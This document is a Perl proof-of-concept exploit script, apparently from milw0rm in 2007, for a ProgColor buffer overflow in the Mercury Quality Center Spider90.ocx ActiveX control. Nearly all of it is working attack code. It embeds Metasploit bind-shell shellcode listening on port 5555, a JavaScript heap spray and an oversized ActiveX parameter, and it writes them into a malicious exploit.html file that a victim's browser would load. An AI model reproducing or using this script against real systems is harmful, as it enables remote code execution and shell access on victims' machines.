#!/usr/bin/perl
# POC exploit for Mercury Quality Center Spider90.ocx ProgColor Overflow
# credit to Skylined, Trirat Puttaraksa, HDM Skape and the rest of the
# metasploit crew. This exploit is just a cut and paste of thier code they # deserve the credit 
# Vulnerability found by Titon and Ri0t of Bastardlabs  

use strict;

# win32_bind LPORT = 5555 - Metasploit
my $shellcode =
"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45".
"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49".
"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d".
"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66".
"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61".
"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40".
"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32".
"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6".
"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09".
"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0".
"\x66\x68\x15\xb3\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff".
"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53".
"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff".
"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64".
"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89".
"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab".
"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51".
"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53".
"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6".
"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0";

my $jscript =
"<script>\n" .
"shellcode = unescape(\"" . convert_shellcode($shellcode) ."\");\n" .
"bigblock = unescape(\"\%u9090\%u9090\");\n" .
"headersize = 20;\n" .
"slackspace = headersize+shellcode.length;\n" .
"while (bigblock.length<slackspace) bigblock+=bigblock;\n" .
"fillblock = bigblock.substring(0, slackspace);\n" .
"block = bigblock.substring(0, bigblock.length-slackspace);\n" .
"while(block.length+slackspace<0x40000) block = block+block+fillblock;\n" .
"memory = new Array();\n" .
"for (i=0;i<350;i++) memory[i] = block + shellcode;\n" .
"</script>";

my $header =
"<html>\n" .
"<head>\n" .
"</head>\n" .
$jscript .
"<body>\n";

my $footer =
"</body>\n" .
"</html>";

my $body = 
"<OBJECT ID=\"MQC\" CLASSID=\"CLSID:98c53984-8bf8-4d11-9b1c-c324fca9cade\" CODEBASE=\"Spider90.ocx#Version=9,1,0,4353\" WIDTH=100\% HEIGHT=100\%>\n" .
"<PARAM NAME=\"ProgColor\" value=\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFFFF\x0d\x0d\x0d\x0d\">\n" .
"</object>\n" .
"</body>\n" .
"</html>";

my $page = "\xff\xfe";	# magic number of M$ unicode file
my $c;


foreach $c (split //, ($header)) {
	$page = $page . $c . "\x00";
}



foreach $c (split //, ($body . $footer)) {
	$page = $page . $c . "\x00";
}

open (IE, ">", "exploit.html");

print IE $page;

close IE;

# This function copy from JSUnescape() code in Metasploit
sub convert_shellcode {
	my $data = shift;
	my $mode = shift() || 'LE';
	my $code = '';
	
	# Encode the shellcode via %u sequences for JS's unescape() function
	my $idx = 0;
	
	# Pad to an even number of bytes
	if (length($data) % 2 != 0) {
		$data .= substr($data, -1, 1);
	}
	
	while ($idx < length($data) - 1) {
		my $c1 = ord(substr($data, $idx, 1));
		my $c2 = ord(substr($data, $idx+1, 1));	
		if ($mode eq 'LE') {
			$code .= sprintf('%%u%.2x%.2x', $c2, $c1);	
		} else {
			$code .= sprintf('%%u%.2x%.2x', $c1, $c2);	
		}
		$idx += 2;
	}
	
	return $code;
}

# milw0rm.com [2007-04-04]
